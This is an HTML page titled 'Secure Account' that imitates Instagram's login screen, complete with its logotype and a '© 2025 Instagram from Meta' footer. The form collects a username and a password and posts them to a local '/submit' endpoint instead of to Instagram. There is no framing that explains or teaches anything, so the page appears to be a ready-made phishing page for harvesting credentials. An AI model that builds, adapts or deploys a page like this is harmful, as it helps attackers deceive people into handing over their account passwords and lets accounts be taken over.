<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Secure Account</title>
</head>

<body style="margin:0; background-color:#000; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh;">
    <div style="max-width:360px; width:100%; padding:30px; text-align:center;">

        <div style="font-family:'Billabong', cursive; font-size:36px; margin-bottom:20px;">Instagram</div>

        <form method="POST" action="/submit" style="text-align:left;">
            <label style="display:block; font-size:14px; margin-bottom:6px; color:#ccc;">Username</label>
            <input name="name" required type="text" placeholder="Phone number, username or email" style="width:100%; padding:10px; margin-bottom:12px; border:1px solid #444; background:#121212; color:#fff; border-radius:5px; box-sizing:border-box;" />

            <label style="display:block; font-size:14px; margin-bottom:6px; color:#ccc;">Password</label>
            <input name="email" required type="password" placeholder="Password" style="width:100%; padding:10px; margin-bottom:12px; border:1px solid #444; background:#121212; color:#fff; border-radius:5px; box-sizing:border-box;" />

            <button type="submit" style="width:100%; padding:10px; background:#3897f0; border:none; border-radius:5px; color:white; font-weight:bold; cursor:pointer;">
        Log In
      </button>
        </form>

        <div style="margin-top:18px; font-size:12px; color:#777; text-align:center;">
            Â© 2025 Instagram from Meta
        </div>
    </div>
</body>

</html>
